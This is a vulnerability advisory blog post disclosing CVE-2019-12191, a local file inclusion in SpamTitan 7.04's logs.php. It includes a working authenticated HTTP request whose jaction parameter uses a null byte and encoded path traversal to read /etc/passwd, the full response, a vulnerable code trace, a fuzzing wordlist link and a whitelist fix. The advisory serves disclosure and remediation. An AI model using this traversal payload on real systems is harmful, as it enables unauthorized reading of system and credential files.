---
layout: post
title:  "Local File Inclusion in SpamTitan Gateway appliance"
date:   2019-05-05 19:51:02 +0700 
categories: [cve]
---

Vulnerability: Local File Inclusion

Vendor: TitanHQ is a trading name of Copperfasten Technologies, 

Product: SpamTitan

Version affected: SpamTitan 7.04, which was the latest available version as of 05/05/2019 (last update:7.04 (Mon 11 Mar, 2019))

#### Product description:

"SpamTitan is a full-service email security solution which protects your business, your employees and your clients.
The solution is extraordinarily simple to set up and manage and provides among its many features 99.97% spam detection,
virus and malware blocking, authentication control, outbound scanning as well as robust reporting structures.
Central to everything we do is our service commitment to our worldwide client base, start our free trial today and see why so many
global brands trust us with their business." as per statement on TitanHQ Spamtitan website. 

* CVE ID: CVE-2019-12191
* CWE ID: CWE-98

#### #Proof of Concept

A local file inclusion vulnerability exists in SpamTitan. 
The vulnerability is due to improper sanitization of the request URI. A remote, authenticated attacker could exploit this vulnerability by sending a crafted request to the target server.Successful exploitation could lead to information disclosure. 

Logs, like maillog.1.bz2, cfma.log.1.bz2 or messages.1.bz2 can be downloaded on log.php site, ie. http://IP/logs.php. via parameter jaction, for example: jaction=download+%2Fvar%2Flog%2Fcfma.log.1.

![Raw HTTP Request/Response ](/static/img/06/03.png)

#### Legitimate HTTP POST request to download log file:
{% highlight ruby %}
POST /logs.php HTTP/1.1
Host: 10.0.0.120
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.120/logs.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 298
Connection: close
Cookie: st-lastroletype=admin; st-domains=domain%3Ayui-dt-asc%3A15; st-trust=ip%3Ayui-dt-asc%3A15; st-smart=sender%3Ayui-dt-asc%3A15; st-whiteip=ip%3Ayui-dt-asc%3A15; st-blackip=ip%3Ayui-dt-asc%3A15; st-tls=domain%3Ayui-dt-asc%3A15; st-tld=tld%3Ayui-dt-asc%3A15; st-spf=ip%3Ayui-dt-asc%3A15; st-etrnblock=ip%3Ayui-dt-asc%3A15; st-etrnallow=ip%3Ayui-dt-asc%3A15; st-dkim=domain%3Ayui-dt-asc%3A15; st-greyip=ip%3Ayui-dt-asc%3A15; st-rbl=ip%3Ayui-dt-asc%3A15; st-greyname=name%3Ayui-dt-asc%3A15; st-greyrcpt=name%3Ayui-dt-asc%3A15; st-domainpolicies=domain%3Ayui-dt-asc%3A15; st-userpolicies=policy_name%3Ayui-dt-asc%3A15; st-realmadmins=email%3Ayui-dt-asc%3A15; st-admins=email%3Ayui-dt-asc%3A15; st-domainadmins=email%3Ayui-dt-asc%3A15; st-realms=name%3Ayui-dt-asc%3A15; PHPSESSID=77bf2e88fe78fe4db58e35f886be8fa4; st-authdomains=domain%3Ayui-dt-asc%3A5; st-disclaimers=domain%3AASC%3A25; st-disclaimers-exemptions=email%3AASC%3A25; wblist-email=email%3Ayui-dt-asc%3A25; wblist-domain=email%3Ayui-dt-asc%3A25; keywords-W=pattern%3Ayui-dt-asc%3A5; keywords-B=pattern%3Ayui-dt-asc%3A5; qset=bspam_level%3Ayui-dt-asc%3A3%3A150; HistoryRequestOpts=100%3A2; st-todaysreports=ts%3Ayui-dt-asc%3A25; st-scheduledreports=email%3Ayui-dt-asc%3A25; st-archivereports=ctime%3Ayui-dt-asc%3A25; st-alerts=name%3Ayui-dt-asc%3A10; st-roles=name%3Ayui-dt-asc%3A15; st-ratecontrols=10; locale=en_US; st-filter=name%3Ayui-dt-asc%3A10; HistoryDisplayOpts=Y%3AY%3AY%3AY%3AY%3AY%3AY%3AY%3AY%3AY; HistoryClusterOpts=Y%3AY
Upgrade-Insecure-Requests: 1

CSRFName=CSRFGuard_1167002136&CSRFToken=ed189351ada51712aec4233ca15e0d03c98a1d9a54220eaaefec751310311ec6bf249b0ea2d83ffae5b3f09612dca4b01557286aebf5acdd179750d96da69540&jaction=download+%2Fvar%2Flog%2Fmaillog.1.bz2&grep=0&selectedCheckboxVal=none&tab=tab0&maillog_ret=7&cfmalog_ret=14&msglog_ret=10
{% endhighlight %}


#### Legitimate response:
{% highlight ruby %}
HTTP/1.1 200 OK
Date: Sun, 05 May 2019 03:58:41 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Disposition: attachment; filename=maillog.1.bz2
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 1412
Connection: close
Content-Type: application/x-octet-stream

BZh91AY&SY>WßPçÿò/¯Î
¿ïÿð`³¾ö
H%DÖ`Ld0ÀÒ·ª 4©úL@iJjl4hhÑ£h ÓÁ0
TDÐ	ôÒ§ä¦É4ö¤ò6õ!|×çk:*/%	CÀs"ðÈ¢<2( Ì(ìCdp G{]4ÑÑx·óÓk¡=`	ðÿw­¶Ûm¶Ûm¶èh úÃÐ~5úùøùWQÞ?Pþ¸yÔo­+´5öGxþµö=T8áYeW+|{C!Ì9~Ü-ÃêdWxÐf¾Ôd9
rGóáÀ}cåQ40ØpÆÛÆØµuõÅuÁ02;gû£wIåoOM!»£,­¶Ûm¶Ûm¶Ûmº
àCÏçúÂÍ]"Îdr:X@ìµ1ÜyúW~=~ç±^øU~µä><ÿïâ=Ò1þ¯â1Qïý¦óô9Ç¾¯Ò<ûÕ_p÷c#Þpý]©¥k[ëXÕ7V£j§Äxz¦þøådåã² D
e0Væªú¼3¤Þ8Ç*Å8!°JIÂÒªªª9³3Û Ï
ªªª¢òÝ¤2!ßÉ_Õ÷Åg´Ë5a]Ù$Æñ­z¦rår«[
é³îÎ-%»o¤qjÈÝd~vX,tÞnøcÚØÆtÅ4á771-¸tÛ]FÄ²0&*Ã
qV"ÚwÓ){c¶n´V¨A.ÒI1	¦g_@Ã,äªªªìÎ fI¼!& %Þ	2ÄÛwÂ¾Aæ1U`bH`:ãqo£²ÄÚRD¤	dÈu$Ý
)ÅÓzºS)u?ô;Ãûþ_¦<Ãú³ü÷VBùb§çþGúÔrÃóçXÍQð¬&÷hcëÙ8IÈæ§£Q©QWäã.Æ\`¦`¸W.Æ*¡ªI*¡"´H,ÅÎ±ÒÕÒü
¡³Ævå¯[\×?ÎãçÎ:@@§È`h>Ñü­¦À¾ÚüÝZÕuCø&ñÌ]ýA|a,ïê:DÔO¼àØo|ÆFEÎ%¬Ýjªª«Æ®L§pddÆdXdâ;«æÀöéèï!Ð>àpj£Ö¿&$Ø9p#¸V¡±Ä90òÜ<5âC-BÎ¨½Ü*Ìl»ZÜ!¯¬xÃ¯ñ^îx|Å¦ÁÌp¯o<ÅÜ1Ç¸qO U©C/pyÛ'ß[«¾<SÅ`}Að£!ò­+Ó ºzr¶
A²rhÀm&©Â±Y¦X¯
FÈÁUÀÜ.¬zì5Ô6¤×Põhå°jïÀ4Ì<+òxy	â&Á}Fð­Õ­qúóÙ0« |xßÌyB«ç^rdu®]£4p&ïVAÅ<CÙ¸N¬T¸åYKÐ:ÆÃ5âCØ#~þãÚ«¶»@Ð^`Þ+p¦Ã¼:¹5AË9È~Ú]13U¢h0´û0á¨µh9t*¼ê´)áXN\F¤-Zá¨`f;­pmwV¸6®ð-ÄMÂáY¬Ú±Ô5ê01åX"úÆÂéL`ø»)ÂÁð¢¸
{% endhighlight %}


The following authenticated HTTP POST request allows an attacker to exploit the Local File Inclusion vulnerability to return /etc/passwd content via jaction parameter.

#### Request:
{% highlight ruby %}
POST /logs.php HTTP/1.1
Host: 10.0.0.120
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.120/logs.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 339
Connection: close
Cookie: st-lastroletype=admin; st-domains=domain%3Ayui-dt-asc%3A15; st-trust=ip%3Ayui-dt-asc%3A15; st-smart=sender%3Ayui-dt-asc%3A15; st-whiteip=ip%3Ayui-dt-asc%3A15; st-blackip=ip%3Ayui-dt-asc%3A15; st-tls=domain%3Ayui-dt-asc%3A15; st-tld=tld%3Ayui-dt-asc%3A15; st-spf=ip%3Ayui-dt-asc%3A15; st-etrnblock=ip%3Ayui-dt-asc%3A15; st-etrnallow=ip%3Ayui-dt-asc%3A15; st-dkim=domain%3Ayui-dt-asc%3A15; st-greyip=ip%3Ayui-dt-asc%3A15; st-rbl=ip%3Ayui-dt-asc%3A15; st-greyname=name%3Ayui-dt-asc%3A15; st-greyrcpt=name%3Ayui-dt-asc%3A15; st-domainpolicies=domain%3Ayui-dt-asc%3A15; st-userpolicies=policy_name%3Ayui-dt-asc%3A15; st-realmadmins=email%3Ayui-dt-asc%3A15; st-admins=email%3Ayui-dt-asc%3A15; st-domainadmins=email%3Ayui-dt-asc%3A15; st-realms=name%3Ayui-dt-asc%3A15; PHPSESSID=83c7c142ef645021ae630f4feb0618dc; st-authdomains=domain%3Ayui-dt-asc%3A5; st-disclaimers=domain%3AASC%3A25; st-disclaimers-exemptions=email%3AASC%3A25; wblist-email=email%3Ayui-dt-asc%3A25; wblist-domain=email%3Ayui-dt-asc%3A25; keywords-W=pattern%3Ayui-dt-asc%3A5; keywords-B=pattern%3Ayui-dt-asc%3A5; qset=bspam_level%3Ayui-dt-asc%3A3%3A150; HistoryRequestOpts=100%3A3; st-todaysreports=ts%3Ayui-dt-asc%3A25; st-scheduledreports=email%3Ayui-dt-asc%3A25; st-archivereports=ctime%3Ayui-dt-asc%3A25; st-alerts=name%3Ayui-dt-asc%3A10; st-roles=name%3Ayui-dt-asc%3A15; st-ratecontrols=10
Upgrade-Insecure-Requests: 1

CSRFName=CSRFGuard_1221655653&CSRFToken=4c3bebd0cf65a0335a444ca33cd5f32e2e9531e8725e61ce49e5b9b98d61f6c706fc592bdf61c6c6c560c24a6cfc7e19725e1564b22af6dbf3482d11be112a21&jaction=download+%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&grep=0&selectedCheckboxVal=none&tab=tab0&maillog_ret=7&cfmalog_ret=14&msglog_ret=10
{% endhighlight %}

#### Response: 
{% highlight ruby %}
HTTP/1.1 200 OK
Date: Sat, 04 May 2019 07:23:39 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Disposition: attachment; filename=passwd
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 2416
Connection: close
Content-Type: application/x-octet-stream

# $FreeBSD: releng/10.1/etc/master.passwd 256366 2013-10-12 06:08:18Z rpaulo $
#
root:*:0:0:SpamTitan:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
cyrus:*:60:60:the cyrus mail server:/nonexistent:/usr/sbin/nologin
postfix:*:125:125:Postfix Mail System:/var/spool/postfix:/usr/sbin/nologin
pgsql:*:70:70:PostgreSQL pseudo-user:/usr/local/pgsql:/bin/sh
postgrey:*:225:225:Postgrey Owner:/nonexistent:/usr/sbin/nologin
rbldns:*:153:153:rbldnsd pseudo-user:/nonexistent:/usr/sbin/nologin
spamd:*:58:58:SpamAssassin user:/var/spool/spamd:/usr/sbin/nologin
amavisd:*:1999:1999:Scanning Virus Account:/var/amavis:/bin/sh
dnscache:*:2000:2000:dnscache pseudo-user:/nonexistent:/sbin/nologin
dnslog:*:2001:2001:dnslog pseudo-user:/nonexistent:/sbin/nologin
tinydns:*:2002:2002:tinydns pseudo-user:/nonexistent:/sbin/nologin
admin:*:2003:2003:SpamTitan Administrative Console:/nonexistant:/usr/local/bin/stconsole
stadmin:*:2004:2004:Administrator:/home/admin:/bin/sh
cbpolicyd:*:2005:2005:Cluebringer Policyd2:/nonexistant:/sbin/nologin
{% endhighlight %}

An attacker might read local files with this vulnerability. User tainted data is used when creating the file name that will be opened and read, 
thus allowing an attacker to read source code and other arbitrary files on the webserver that might lead to new attack vectors. 
The attacker can detect new vulnerabilities in source code files or read user credentials.

{% highlight ruby %}
    148: readfile readfile($filename); 
        139: $filename = '/dev/null';  // if(preg_match('/' . $engine . '/', $filename)) else , 
        136: $filename = '/var/log/' . $filename;  // if(preg_match('/' . $engine . '/', $filename)),
            133: $filename = str_replace(' ', '', $filename); 
                132: $filename = (stripslashes(trim($_POST['logfile'], './ ' . "\t\n")) : 'none'); 

        requires:
            89: switch($jaction)
            131:  case 'download' : 
{% endhighlight %}


Sensitive file detection automated with Intruder option of Burpsuite proxy, where i used simple list of files, https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/lfi/JHADDIX_LFI.txt 

![File enumeration with burpsuite proxy](/static/img/06/02.png)

#### Solution
{% highlight ruby %}
Build a whitelist for positive file names. Do not only limit the file name to specific paths or extensions.

1: $files  =  array("index.php",  "main.php");  if(!in_array($_GET["file"],  $files)) exit ; 
{% endhighlight %}

#### References
1. https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
2. https://en.wikipedia.org/wiki/File_inclusion_vulnerability
3. https://www.titanhq.com/spamtitan
4. https://www.spamtitan.com/wp-content/uploads/2016/02/Titan_HQ_SpamTitan_Gateway_datasheet_.pdf
5. https://www.spamtitan.com/spamtitan-gateway-sign-up-confirmation/
